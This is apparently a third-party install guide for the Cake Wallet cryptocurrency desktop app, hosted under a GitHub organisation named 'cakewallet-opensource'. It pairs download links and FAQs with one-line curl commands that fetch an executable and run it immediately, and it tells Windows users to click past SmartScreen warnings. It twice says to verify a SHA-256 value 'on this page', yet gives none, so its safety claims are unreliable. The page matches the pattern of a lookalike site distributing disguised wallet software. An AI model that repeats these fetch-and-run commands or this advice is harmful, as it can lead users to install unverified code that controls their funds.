![Cake Wallet linux install guide](assets/cake-wallet-linux-install-article-banner.png)

# Install Cake Wallet on Linux

Choose between the portable archive and the Flatpak, then restore your wallet.

## Downloads - v6.4.5

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`cake-wallet-desktop-v6.4.5-windows.exe`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`cake-wallet-desktop-v6.4.5-macos.dmg`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`cake-wallet-desktop-v6.4.5-linux.xz`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz) |

Every file on this page comes from the [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest).

> Cake Wallet never asks for your recovery phrase, and no support channel needs it.

The Linux release ships as cake-wallet-desktop-v6.4.5-linux.xz and cake-wallet-desktop-v6.4.5-linux.flatpak. Take the Flatpak if you already use Flatpak, otherwise the archive: extract it and run the binary inside. Then create or restore a wallet from your phrase.

<!-- ARTICLE-BODY-BEGIN -->

## Pick the Linux package
Both files contain the same wallet. The .xz archive is a self-contained directory you can keep anywhere and run without installing; the .flatpak is for systems that already manage applications through Flatpak. Neither needs root to run, and neither bundles a second copy of your wallet data if you later switch format.

Check the SHA-256 of whichever file you take against the value on this page before you extract or install it. The <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest">latest Cake Wallet desktop build</a> is the only source you should be comparing against, and the two Linux assets have different hashes because they are different files.

## Install from the archive
Extract the archive into a folder you control, then run the executable inside it. Keep the whole folder together: the binary expects the bundled libraries beside it, so moving the executable alone is what produces "cannot open shared object file" errors.

On distributions that use a sandboxed home directory, the wallet's data lives inside that sandbox, and a later move to the Flatpak version will not see it. Restoring from the phrase is the reliable way across formats. <a href="https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-windows-install.md">Install Cake Wallet on Windows</a> describes the equivalent desktop steps if you keep a second machine.

## After first launch
The app asks for a PIN and then offers create or restore. Restore if you hold funds, and check that the balance appears before you rely on the new install. A first sync on Linux is no faster or slower than on any other desktop platform; it depends on the node and the chain.

If you have never restored before, the choices can look cryptic: phrase, keys, QR, backup file, hardware device. <a href="https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-restore-wallet.md">Restore an existing Cake Wallet wallet</a> maps each one to the kind of backup it expects, including the 25-word Monero seed that needs the Legacy type.

## If the wallet never finishes syncing
A Linux install that shows "Disconnected" or sits on a block count is usually failing to reach a node, not failing to install. Check that the machine has outbound access, then switch or add a node before you rescan anything.

Rescanning a healthy wallet wastes hours, so treat it as the last step rather than the first. <a href="https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-monero-sync.md">Cake Wallet Monero sync problems</a> separates a slow first sync from a stuck one using the app's own indicators, and explains why the node choice comes first.

## Both desktop builds
The macOS build follows the same layout and the same restore flow, with a first-launch confirmation instead of a package choice. If your household runs more than one desktop platform, keep the phrase for each wallet somewhere both machines can reach without a network.

<a href="https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-macos-install.md">Install Cake Wallet on macOS</a> covers the .dmg steps and the Intel and Apple silicon question in one page. Neither desktop build pairs with Cupcake, which is a phone-only signer.

## FAQ
### Should I use the Flatpak or the archive?
Use the Flatpak if you already install software that way and want sandboxing. Otherwise take the archive: it runs in place and needs no system integration.
### Does Cake Wallet work on Linux still?
Yes. The current release publishes two Linux assets, and both are built from the same wallet as the other desktop platforms.
### Why does Cake Wallet show Disconnected on Linux?
The app cannot reach its node. Check the connection, then change the node rather than reinstalling the wallet.
### Can I install on Tails?
Only as a portable archive inside the persistent volume. If you lose the volume you lose the wallet, so keep the phrase outside that machine.

<!-- ARTICLE-BODY-END -->

## How to install Cake Wallet

<!-- INSTALL-BEGIN -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe">cake-wallet-desktop-v6.4.5-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg">cake-wallet-desktop-v6.4.5-macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz">cake-wallet-desktop-v6.4.5-linux.xz</a> or the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.flatpak">cake-wallet-desktop-v6.4.5-linux.flatpak</a>.
2. Archive: extract it and run the executable inside the extracted folder.
3. Flatpak: run `flatpak install ./cake-wallet-desktop-v6.4.5-linux.flatpak` where you saved it.
4. Launch Cake Wallet and restore your wallet.
<!-- INSTALL-END -->

## Related guides
[restore a wallet in Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-restore-wallet.md) · [Cake Wallet Monero sync problems](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-monero-sync.md) · [install Cake Wallet on Windows](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-windows-install.md) · [latest Cake Wallet desktop build](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest)
